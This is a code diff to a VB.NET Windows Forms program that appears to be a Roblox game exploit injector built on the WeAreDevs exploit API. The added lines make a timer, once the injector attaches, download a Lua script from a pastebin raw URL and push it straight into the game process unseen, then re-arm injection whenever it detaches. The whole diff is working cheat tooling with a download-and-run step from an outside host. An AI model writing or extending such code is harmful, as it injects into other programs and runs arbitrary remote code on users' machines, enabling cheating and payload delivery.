@@ -1,5 +1,6 @@
 ﻿Imports System.IO
 Imports WeAreDevs_API
+Imports System.Net
 Public Class Form1
 
     Dim hax As ExploitAPI = New ExploitAPI
@@ -39,6 +40,7 @@ Public Class Form1
     End Sub
 
     Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
+        InjTest.Start()
         hax.LaunchExploit()
     End Sub
 
@@ -170,7 +172,12 @@ Public Class Form1
 
     Private Sub InjTest_Tick(sender As Object, e As EventArgs) Handles InjTest.Tick
         If hax.isAPIAttached = True Then
+            Dim wb As WebClient = New WebClient()
+            Dim Script As String = wb.DownloadString("https://pastebin.com/raw/6M4GpD10")
+            hax.SendLuaScript(Script)
             Label3.Text = "injected"
+            InjTest2.Start()
+            InjTest.Stop()
         Else
             Label3.Text = "not injected"
         End If
@@ -179,5 +186,21 @@ Public Class Form1
     Private Sub RichTextBox1_TextChanged(sender As Object, e As EventArgs) Handles RichTextBox1.TextChanged
         'DONT FUCKING ASK
         RichTextBox1.Text = "exploit then the problem probably is that the if you are having trouble launching the  exploit is patched just wait for the devs to  release a new update this usually takes  around four hours to a day"
+    End Sub
+
+    Private Sub Button26_Click(sender As Object, e As EventArgs) Handles Button26.Click
+        ScriptHub.Show()
+    End Sub
+
+    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
+
+    End Sub
+
+    Private Sub InjTest2_Tick(sender As Object, e As EventArgs) Handles InjTest2.Tick
+        If hax.isAPIAttached = False Then
+            Label3.Text = "not injected"
+            InjTest.Start()
+            InjTest2.Stop()
+        End If
     End Sub
 End Class
